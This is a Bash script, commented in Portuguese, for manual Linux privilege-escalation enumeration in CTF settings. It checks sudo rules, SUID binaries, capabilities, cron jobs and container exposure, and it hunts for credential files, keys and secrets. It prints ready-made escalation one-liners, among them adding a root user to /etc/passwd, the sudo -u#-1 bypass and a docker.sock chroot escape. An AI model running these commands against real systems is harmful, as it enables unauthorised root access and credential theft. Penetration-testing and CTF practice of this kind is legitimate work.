#!/usr/bin/env bash
# =============================================================================
#  linux_privesc.sh - Enum manual de privesc Linux (quando LinPEAS é pesado,
#  bloqueado, ou você quer entender O QUE está olhando).
#  Uso: bash linux_privesc.sh 2>/dev/null | tee enum.txt
#  Transferir: python3 -m http.server 80 (Kali)  ->  wget http://KALI/linux_privesc.sh
# =============================================================================
R='\033[1;31m'; Y='\033[1;33m'; G='\033[1;32m'; B='\033[1;34m'; N='\033[0m'
h(){ echo -e "\n${B}==================== $* ====================${N}"; }
hit(){ echo -e "${R}[!!!] $*${N}"; }
note(){ echo -e "${Y}[+] $*${N}"; }

# binários que o GTFOBins tem vetor de shell/leitura (lista enxuta, os mais vistos)
GTFO="aria2c|awk|base64|bash|busybox|cat|chmod|chown|cp|cpulimit|curl|dash|date|dd|diff|docker|ed|emacs|env|expect|find|flock|gawk|gcc|gdb|git|grep|head|less|lua|make|man|more|mv|mysql|nano|nc|nice|nmap|node|openssl|perl|php|pip|python|python2|python3|rsync|ruby|scp|sed|socat|sqlite3|ssh|strace|systemctl|tail|tar|taskset|tee|timeout|uniq|vi|vim|wget|xxd|zip|zsh|vagrant|sqlmap|journalctl|apt|apt-get|ftp|screen|tmux|watch|xargs|ld.so|cut|nawk|jq|rvim|view"

h "IDENTIDADE"
id; hostname; echo "Kernel: $(uname -r)  Arch: $(uname -m)"
cat /etc/os-release 2>/dev/null | grep -E '^(PRETTY_NAME|VERSION_ID)'
id | grep -qE '\((docker|lxd|lxc|disk|adm|shadow|sudo|wheel|video)\)' && \
  hit "Grupo privilegiado: $(id | grep -oE '\((docker|lxd|lxc|disk|adm|shadow|sudo|wheel|video)\)' | tr '\n' ' ')"

h "SUDO"
sudo -V 2>/dev/null | head -1
SL=$(sudo -n -l 2>/dev/null)
if [[ -n "$SL" ]]; then
  echo "$SL"
  echo "$SL" | grep -q NOPASSWD && hit "Tem NOPASSWD! Pesquise cada binário no GTFOBins (seção Sudo)"
  echo "$SL" | grep -qE 'env_keep.*LD_PRELOAD' && hit "LD_PRELOAD preservado -> shared object malicioso"
  echo "$SL" | grep -qE '\(ALL, ?!root\)' && hit "(ALL, !root) -> testar CVE-2019-14287: sudo -u#-1 <cmd>"
  echo "$SL" | grep -oE '/[^ ,]+' | grep -E "/($GTFO)$" | while read -r b; do hit "sudo GTFOBin: $b"; done
else
  note "sudo -l pede senha (rode manualmente se tiver a senha do user)"
fi
SV=$(sudo -V 2>/dev/null | head -1 | grep -oE '[0-9]+\.[0-9]+\.[0-9]+(p[0-9]+)?')
[[ -n "$SV" ]] && note "sudo $SV  -> <1.9.5p2 = possível Baron Samedit (CVE-2021-3156) | <1.8.28 = CVE-2019-14287"

h "SUID / SGID"
find / -perm -4000 -type f 2>/dev/null | tee /tmp/.suid | while read -r f; do
  b=$(basename "$f")
  if echo "$b" | grep -qxE "$GTFO"; then hit "SUID GTFOBin: $f"; else echo "    $f"; fi
done
grep -q pkexec /tmp/.suid && note "pkexec SUID -> checar PwnKit (CVE-2021-4034): pkexec --version (<0.120 vulnerável)"
echo "--- SGID:"; find / -perm -2000 -type f 2>/dev/null | head -20

h "CAPABILITIES"
getcap -r / 2>/dev/null | while read -r l; do
  echo "$l" | grep -qE 'cap_setuid|cap_dac_read_search|cap_dac_override|cap_sys_admin|cap_sys_ptrace' \
    && hit "$l" || echo "    $l"
done

h "CRON / TIMERS"
cat /etc/crontab 2>/dev/null | grep -v '^#'
ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/ 2>/dev/null
crontab -l 2>/dev/null
systemctl list-timers --all 2>/dev/null | head -15
note "Processo escondido rodando como root? Use pspy64 (github.com/DominicBreuker/pspy)"
# scripts de cron que eu consigo escrever
grep -hoE '/[^ ]+\.(sh|py|pl)' /etc/crontab /etc/cron.d/* 2>/dev/null | sort -u | while read -r s; do
  [[ -w "$s" ]] && hit "Script de cron GRAVÁVEL: $s"
done

h "ARQUIVOS SENSÍVEIS GRAVÁVEIS / LEGÍVEIS"
[[ -w /etc/passwd ]] && hit "/etc/passwd GRAVÁVEL -> openssl passwd -1 senha; echo 'r00t:HASH:0:0::/root:/bin/bash' >> /etc/passwd"
[[ -r /etc/shadow ]] && hit "/etc/shadow LEGÍVEL -> unshadow + john"
[[ -w /etc/shadow ]] && hit "/etc/shadow GRAVÁVEL"
[[ -w /etc/sudoers ]] && hit "/etc/sudoers GRAVÁVEL"
ls -la /root 2>/dev/null && hit "/root listável!"
find / -writable -type f -not -path '/proc/*' -not -path '/sys/*' -not -path '/dev/*' \
     -not -path '/run/*' -not -path "$HOME/*" -not -path '/tmp/*' -not -path '/var/tmp/*' 2>/dev/null | head -25

h "PATH HIJACK"
echo "$PATH" | tr ':' '\n' | while read -r d; do [[ -w "$d" ]] && hit "Diretório do PATH gravável: $d"; done

h "CREDENCIAIS"
for f in ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.viminfo; do [[ -s $f ]] && { note "$f"; tail -20 "$f"; }; done
find / -name "*.kdbx" -o -name "id_rsa*" -o -name "*.pem" -o -name ".git-credentials" -o -name "wp-config.php" \
       -o -name ".env" -o -name "config.php" -o -name "*.ovpn" 2>/dev/null | grep -v '/proc/' | head -30
grep -rIilE 'pass(word)?\s*[=:]' /var/www /opt /etc /home 2>/dev/null | head -20
env | grep -iE 'pass|key|secret|token'

h "REDE / SERVIÇOS INTERNOS"
(ss -tulpn 2>/dev/null || netstat -tulpn 2>/dev/null) | grep -E 'LISTEN|udp'
note "Porta só em 127.0.0.1? -> port forward: ssh -L 8000:127.0.0.1:PORTA user@alvo  (ou chisel)"

h "PROCESSOS ROOT"
ps -eo user,pid,cmd --sort=user 2>/dev/null | grep -E '^root' | grep -vE '\[|sshd|systemd|kworker' | head -25

h "CONTAINER / NFS"
[[ -f /.dockerenv ]] && hit "Dentro de container Docker"
grep -qa 'docker\|lxc' /proc/1/cgroup 2>/dev/null && note "cgroup indica container"
[[ -S /var/run/docker.sock ]] && hit "docker.sock exposto -> docker run -v /:/mnt --rm -it alpine chroot /mnt sh"
grep -v '^#' /etc/exports 2>/dev/null | grep -q no_root_squash && hit "NFS no_root_squash em /etc/exports"

h "KERNEL - CANDIDATOS"
KV=$(uname -r | cut -d- -f1)
note "Kernel $KV - confira com linux-exploit-suggester (les.sh). Clássicos:"
echo "    DirtyCow CVE-2016-5195 (<4.8.3) | DirtyPipe CVE-2022-0847 (5.8 a 5.16.11)"
echo "    GameOverlay CVE-2023-2640/32629 (Ubuntu) | nf_tables CVE-2024-1086 (5.14-6.6)"
echo "    Kernel exploit é ÚLTIMO recurso: pode derrubar a máquina do CTF."

echo -e "\n${G}[OK] Fim. Linhas vermelhas = prioridade. Procure flag: find / -iname '*flag*' 2>/dev/null${N}"
